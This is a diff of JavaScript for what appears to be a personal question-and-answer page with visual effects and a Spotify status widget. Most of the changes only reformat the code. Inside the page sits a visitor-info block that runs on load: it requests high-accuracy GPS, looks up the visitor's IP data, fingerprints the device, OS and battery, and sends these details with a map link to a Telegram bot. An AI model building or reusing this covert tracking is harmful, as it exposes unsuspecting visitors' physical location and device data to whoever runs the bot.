@@ -174,9 +174,6 @@ document.getElementById('sendQ').addEventListener('click', async () => {
 
 // === INFO PENGUNJUNG ===
 (async function showVisitorInfo() {
-  const savedUser = localStorage.getItem("ig_user") || "Anonim";
-
-  // --- Visitor ID & kunjungan ---
   try {
     let visitorID = localStorage.getItem("visitor_id");
     if (!visitorID) {
@@ -195,17 +192,19 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
     visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
     localStorage.setItem("visitor_visits", String(visitCount));
-  } catch (err) { console.warn("visitor error:", err); }
+  } catch (err) { console.warn("visitor-id error:", err); }
 
-  // --- Safe fetch dengan retry ---
+  const savedUser = localStorage.getItem("ig_user") || "Anonim";
   async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
     for (let i = 0; i < retries; i++) {
       try { return await fetch(url, opts); }
-      catch (e) { if(i === retries-1) throw e; await new Promise(r=>setTimeout(r,retryDelay*Math.pow(2,i))); }
+      catch (e) {
+        if (i === retries - 1) throw e;
+        await new Promise(r => setTimeout(r, retryDelay * Math.pow(2,i)));
+      }
     }
   }
 
-  // --- Deteksi brand & model device ---
   function detectDeviceBrandModel() {
     const ua = navigator.userAgent.toLowerCase();
     let brand = "Tidak diketahui", model = "";
@@ -231,33 +230,53 @@ document.getElementById('sendQ').addEventListener('click', async () => {
       const m = ua.match(/galaxy\s?([asnjz]\d{1,3}|note\s?\d{1,2})/i);
       model = "Galaxy " + m[1].toUpperCase();
     } else if (/redmi\s(note|[0-9]+)/i.test(ua)) {
-      const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i); model=m[0].replace(/\s+/g," ");
-    } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
-    else if (/mi\s([0-9a-z]+)/i.test(ua)) model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
-    else if (/vivo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
-    else if (/oppo\s([a-z0-9]+)/i.test(ua)) model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
-    else if (/realme\s([a-z0-9]+)/i.test(ua)) model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
-    else if (/iphone\s?[0-9]*/i.test(ua)) { const m = ua.match(/iphone\s?[0-9]*/i); model = m ? m[0].replace(/\s+/g," ") : "iPhone"; }
+      const m = ua.match(/redmi\s(note\s?\d+|[0-9]+)/i);
+      model = m[0].replace(/\s+/g," ");
+    } else if (/poco\s([a-z0-9\s]+)/i.test(ua)) {
+      model = ua.match(/poco\s([a-z0-9\s]+)/i)[0].toUpperCase();
+    } else if (/mi\s([0-9a-z]+)/i.test(ua)) {
+      model = ua.match(/mi\s([0-9a-z]+)/i)[0].toUpperCase();
+    } else if (/vivo\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/vivo\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/oppo\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/oppo\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/realme\s([a-z0-9]+)/i.test(ua)) {
+      model = ua.match(/realme\s([a-z0-9]+)/i)[0].toUpperCase();
+    } else if (/iphone\s?[0-9]*/i.test(ua)) {
+      const m = ua.match(/iphone\s?[0-9]*/i);
+      model = m ? m[0].replace(/\s+/g," ") : "iPhone";
+    }
 
-    if (model && !model.toLowerCase().includes(brand.toLowerCase())) return `${brand} ${model}`;
+    if (model && !model.toLowerCase().includes(brand.toLowerCase()))
+      return `${brand} ${model}`;
     return brand;
   }
 
-  // --- Kirim info visitor ---
   async function sendToTelegram(d, latitude, longitude, source="Unknown", accuracy=null) {
     try {
       const now = new Date();
-      const mapLink = (latitude && longitude) ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17` : "https://www.google.com/maps";
+      const mapLink = (latitude && longitude)
+        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+        : "https://www.google.com/maps";
+
       const isMobile = /mobile/i.test(navigator.userAgent);
       const deviceType = isMobile ? "📱 Mobile" : "🖥️ Desktop";
       const brandModel = isMobile ? detectDeviceBrandModel() : "PC / Laptop";
+
       const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
-                 /Android/i.test(navigator.userAgent) ? "Android" :
-                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
-                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
-                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+        /Android/i.test(navigator.userAgent) ? "Android" :
+        /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+        /Mac/i.test(navigator.userAgent) ? "MacOS" :
+        /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+
       let batteryInfo = "Tidak diketahui";
-      try { if(navigator.getBattery){ const b=await navigator.getBattery(); batteryInfo=`${(b.level*100).toFixed(0)}% (${b.charging?"⚡":"🔋"})`; } } catch {}
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          batteryInfo = `${(b.level*100).toFixed(0)}% (${b.charging?"⚡":"🔋"})`;
+        }
+      } catch {}
+
       const visitorID = localStorage.getItem("visitor_id") || "unknown";
       const visits = localStorage.getItem("visitor_visits") || "1";
       const firstSeen = localStorage.getItem("visitor_first_seen") || null;
@@ -281,12 +300,13 @@ document.getElementById('sendQ').addEventListener('click', async () => {
         headers:{ "Content-Type":"application/json" },
         body:JSON.stringify({ chat_id:CHAT_ID, text:msg })
       },4);
-    } catch(e){ console.error("Gagal memuat:",e); }
+    } catch(e){ console.error("❌ Gagal kirim info:",e); }
   }
 
-  // --- PROSES UTAMA ---
   try {
-    const coords = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0}));
+    const coords = await new Promise((res,rej)=>{
+      navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0});
+    });
     const {latitude,longitude,accuracy} = coords.coords;
     const ipData = await (await fetch("https://ipwho.is/")).json();
     await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
@@ -295,11 +315,12 @@ document.getElementById('sendQ').addEventListener('click', async () => {
       const d = await (await fetch("https://ipwho.is/")).json();
       await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
     } catch(e){
-      console.error("Gagal:", e);
+      console.error("❌ Gagal ambil data IP:", e);
       await sendToTelegram({city:"?",country:"?",ip:"?"},null,null,"unknown");
     }
   }
 })();
+
 // === EFEK BUTTERFLY 💸 ===
 (function () {
   const area = document.querySelector('.card');
@@ -415,6 +436,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   area.addEventListener('touchend', endHold);
   area.addEventListener('touchcancel', endHold);
 })();
+
 // === LIVE STATUS + SPOTIFY ===
 (async function(){
   const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
@@ -554,8 +576,4 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
-
-
-
-
 
